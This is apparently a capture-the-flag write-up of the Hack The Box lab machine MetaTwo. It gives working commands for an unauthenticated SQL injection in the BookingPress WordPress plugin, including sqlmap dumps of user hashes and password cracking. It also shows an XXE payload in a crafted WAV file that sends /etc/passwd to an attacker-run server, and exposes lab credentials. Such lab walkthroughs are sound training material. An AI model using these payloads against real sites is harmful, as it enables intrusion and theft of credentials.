# Machine abstract

MetaTwo is a Linux machine presenting an entry-level challenge. The website, powered by WordPress, employs a plugin susceptible to unauthenticated SQL injection (CVE-2022-0739). This vulnerability can be exploited to extract password hashes of WordPress users, facilitating further password cracking attempts on the WordPress user manager.

Moreover, the WordPress version installed on the server is susceptible to an XXE Vulnerability in its Media Library (CVE-2021-29447). This vulnerability enables attackers to retrieve credentials for the FTP server. Accessing a specific file on the FTP server unveils SSH credentials for the user 'jnelson'.

For privilege escalation, leveraging the passpie utility, present on the remote host, can be advantageous. It enables acquiring the root user's password, thus facilitating complete control over the system.

# Enumeration
## Nmap



Started exploiting the machine by scanning for the open ports with the command 

```bash
nmap -vv -sV -oN nmap.scan -T4 10.10.11.186
```

```nmap

The above nmap results to 3 ports under 10,000 ports scanned
- 21/tcp open ftp
- 22/tcp open ssh
- 80/tcp open http

## HTTP

Surfing the IP address, I seemed like a static wordpress static page

![Alt text](/assets/img/htb/MetaTwo/mt1.png)

Using the command `wpscan`, I was able to discover and enumerate alot about the wordpress with the command

```shell 
wpscan --url http://metapress.htb --enumerate u vp -v --force --api-token <api-key>  --detection-mode aggressive --plugins-detection aggressive -o wpsan.info
```

## Interesting Finding(s):

> robots.txt

it exposed `robots.txt` used for  guiding web crawlers on which areas they're allowed to crawl or not, aiding in privacy, server load management, and duplicate content prevention.

```bash

After identiying this plugin, I confirmed that it was installed in the wordpress and indeed the form was there


![Alt text](/assets/img/htb/MetaTwo/mt3.png)

## Exploiting the wordpress

Googlint the bookingpress-appointment-booking version 1.0.10, I found this [Poc](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357/)

The exploit works where by the plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
Using curl , we could check the database and So we only need to find the `wpnonce` value

![Alt text](/assets/img/htb/MetaTwo/mt4.png)

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=574c0c8595&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' 
```


![Alt text](/assets/img/htb/MetaTwo/mt5.png)

Using sqlmap with the command following, I was able to dump 2 tables

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=574c0c8595&category_id=1&total_service=1' -p total_service --level=5 --risk=3 --dbs  --batch
```

![Alt text](/assets/img/htb/MetaTwo/mt6.png)

With the command 

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=574c0c8595&category_id=1&total_service=1' -p total_service --level=5 --risk=3 --dbs  --batch -D blog --tables
```

```nmap
[02:37:23] [INFO] fetching tables for database: 'blog'
Database: blog
[27 tables]
---snippet --------------------------------
             |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |

[02:37:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'
[02:37:24] [WARNING] your sqlmap version is outdated

```

To read the contents of table wp_users, I ran the following command

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=574c0c8595&category_id=1&total_service=1' -p total_service --level=5 --risk=3 --dbs  --batch -D blog  -T wp_users --dump 
```
And with that we had user's hashes

![Alt text](/assets/img/htb/MetaTwo/mt7.png)

## Cracking the hash

using the command `john --wordlist=/usr/share/wordlists/rockyou.txt hash `
I was able to crack the manager's hash

```bash
└─# john --show hashs
Passpie:blink182:::Passpie (Auto-generated by Passpie) <passpie@local>::keys

1 password hash cracked, 0 left
```
Logged in and we were in this dashboard

## Exploiting wordpress to get a shell

Remember to that exploit we got ealier `CVE-2021-29447`, Well this is the time to try it and with this [PoC](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)

1st we generate the WAVE file with the payload that I used with the following command:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"\"http://10.10.14.18/evil.dtd\""'>%remote;%init;%trick;]>\x00' > upload.wav
```

And inside the evil.dtd I put the following XML document:

```bash
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.18:9001/?p=%file;'>" >

```

and uploaded it the wordpress

![Alt text](/assets/img/htb/MetaTwo/mt9.png)

Then I started a webserver on the same directory where evil.dtd file is, with something like:

`php -S 10.10.14.18:9001`

And right after uploading, I had the `/etc/passwd` file back in base64 encoded

![Alt text](/assets/img/htb/MetaTwo/mt10.png)
![Alt text](/assets/img/htb/MetaTwo/mt11.png)

Let's now try retrieving the wp-config.php file as it contains the Wordpress configuration info by using the
following payload in the evil.dtd file
and we have the configuration with both mysql and ftp password authentication 

![Alt text](/assets/img/htb/MetaTwo/mt12.png)

# FTP 

After logging in FTP I didn't have permission to write to the blog filesystem so that you can shell directly

![Alt text](/assets/img/htb/MetaTwo/mt13.png)

But I found some credentials in mailer/send_email.php

```nmap
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;       
```

# Privilege Escalation

In the home folder, there was a hidden folder called `.passpie` and after [googling](https://github.com/marcwebbie/passpie), I found that it is a command line tool to manage passwords from the terminal with a colorful and configurable interface.

In that folder there was a key file and typing  `passpie`, you could see 2 passwords file stored there

![Alt text](/assets/img/htb/MetaTwo/mt15.png)

Trying to export the password, It need a key

![Alt text](/assets/img/htb/MetaTwo/mt16.png)

I copped the private part of the key and generated the password hash from the private GPG key using gpg2john and save it into a file named hash and wiht the help of john I was able to the passphrase

![Alt text](/assets/img/htb/MetaTwo/mt17.png)

I was finally able to use the passphrase to export the password of the root and switch to user root using this password.
